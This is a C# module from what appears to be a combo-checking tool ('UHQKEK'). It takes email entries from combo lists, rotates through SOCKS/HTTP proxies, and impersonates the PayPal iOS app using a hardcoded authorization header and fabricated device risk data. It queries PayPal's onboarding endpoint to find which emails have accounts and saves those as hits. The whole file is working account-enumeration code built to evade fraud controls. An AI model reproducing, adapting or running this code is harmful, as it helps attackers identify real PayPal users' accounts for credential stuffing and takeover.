using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using HttpStatusCode = Leaf.xNet.HttpStatusCode;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class PayPal
    {
        public static bool check(string combo)
        {
            try
            {

                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "PayPal/69 (iPhone; iOS 14.6; Scale/2.00)");
                httpRequest.AddHeader("Accept", "application/json");
                httpRequest.AddHeader("Host", "api-m.paypal.com");
                httpRequest.AddHeader("Authorization", "Basic QVY4aGRCQk04MHhsZ0tzRC1PYU9ReGVlSFhKbFpsYUN2WFdnVnB2VXFaTVRkVFh5OXBtZkVYdEUxbENxOg==");
                httpRequest.AddHeader("Content-Type", "application/json");
                httpRequest.AddHeader("x-paypal-mobileapp", "dmz-access-header");
                httpRequest.AddHeader("Accept-Language", "en-us");
                httpRequest.AllowAutoRedirect = true;
                string str1 = httpRequest.Post("https://api-m.paypal.com/v1/mfsonboardingserv/user/verification/email", "{\"flowId\":\"Onboarding\",\"riskData\":\"{\\\"is_emulator\\\":false,\\\"device_uptime\\\":,\\\"ip_addrs\\\":\\\"\\\",\\\"risk_comp_session_id\\\":\\\"\\\",\\\"device_model\\\":\\\"iPhone\\\",\\\"linker_id\\\":\\\"\\\",\\\"app_version\\\":\\\"7.42.3\\\",\\\"os_type\\\":\\\"iOS\\\",\\\"location_auth_status\\\":\\\"unknown\\\",\\\"is_rooted\\\":false,\\\"ds\\\":true,\\\"TouchIDEnrolled\\\":\\\"false\\\",\\\"app_id\\\":\\\"com.yourcompany.PPClient\\\",\\\"proxy_setting\\\":\\\"host=,port=,type=\\\",\\\"conf_url\\\":\\\"https:\\\\\\/\\\\\\/www.paypalobjects.com\\\\\\/rdaAssets\\\\\\/magnes\\\\\\/magnes_ios_rec.json\\\",\\\"payload_type\\\":\\\"full\\\",\\\"rf\\\":\\\"0000\\\",\\\"app_guid\\\":\\\"\\\",\\\"email_configured\\\":true,\\\"tz_name\\\":\\\"Europe\\\\\\/\\\",\\\"locale_lang\\\":\\\"en\\\",\\\"bindSchemeAvailable\\\":\\\"crypto:kmli,biometric:faceid\\\",\\\"cloud_identifier\\\":\\\"\\\",\\\"total_storage_space\\\":127933894656,\\\"tz\\\":7200000,\\\"locale_country\\\":\\\"\\\",\\\"pairing_id\\\":\\\"\\\",\\\"dbg\\\":false,\\\"c\\\":95,\\\"sr\\\":{\\\"gy\\\":true,\\\"mg\\\":true,\\\"ac\\\":true},\\\"vendor_identifier\\\":\\\"\\\",\\\"t\\\":false,\\\"TouchIDAvailable\\\":\\\"true\\\",\\\"dc_id\\\":\\\"\\\",\\\"device_name\\\":\\\"\\\",\\\"magnes_source\\\":10,\\\"pin_lock_last_timestamp\\\":,\\\"local_identifier\\\":\\\"\\\",\\\"os_version\\\":\\\"14.6\\\",\\\"timestamp\\\":1626436936905,\\\"source_app_version\\\":\\\"7.42.3\\\",\\\"conn_type\\\":\\\"wifi\\\",\\\"PasscodeSet\\\":\\\"true\\\",\\\"magnes_guid\\\":{\\\"created_at\\\":1594847338188,\\\"id\\\":\\\"\\\"},\\\"conf_version\\\":\\\"1.0\\\",\\\"ip_addresses\\\":[\\\"\\\"],\\\"bindSchemeEnrolled\\\":\\\"none\\\",\\\"mg_id\\\":\\\"\\\",\\\"comp_version\\\":\\\"5.2.0\\\",\\\"sms_enabled\\\":true}\",\"appInfo\":\"{\\\"device_app_id\\\":\\\"com.yourcompany.PPClient\\\",\\\"client_platform\\\":\\\"Apple\\\",\\\"app_version\\\":\\\"7.42.3\\\",\\\"app_category\\\":3,\\\"app_guid\\\":\\\"\\\",\\\"push_notification_id\\\":\\\"disabled\\\"}\",\"emailId\":\"" + strArray1[0] + "\",\"firstPartyClientId\":\"\",\"deviceInfo\":\"{\\\"device_identifier\\\":\\\"\\\",\\\"device_name\\\":\\\"\\\",\\\"device_type\\\":\\\"iOS\\\",\\\"device_key_type\\\":\\\"APPLE_PHONE\\\",\\\"device_model\\\":\\\"iPhone\\\",\\\"device_os\\\":\\\"iOS\\\",\\\"device_os_version\\\":\\\"14.6\\\",\\\"is_device_simulator\\\":false,\\\"pp_app_id\\\":\\\"\\\"}\",\"redirectUri\":\"urn:ietf:wg:oauth:2.0:oob\"}", "application/json").ToString();
                if (str1.Contains("\"status\":\"Failure\",\""))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    //Program.Save(combo, "Invalids");
                    return true;
                }
                else if (str1.Contains("This email already exists with PayPal") || str1.Contains("status\":\"Success"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    lock (Program.Locker)
                    {
                        if (Program.Lock == "Y")
                        {
                            Console.ForegroundColor = Color.Green;
                            Console.WriteLine("[+]" + combo, Color.Green);
                        }
                    }
                    Program.Save(combo, "PayPal VM");
                    return true;

                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch (Exception)
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
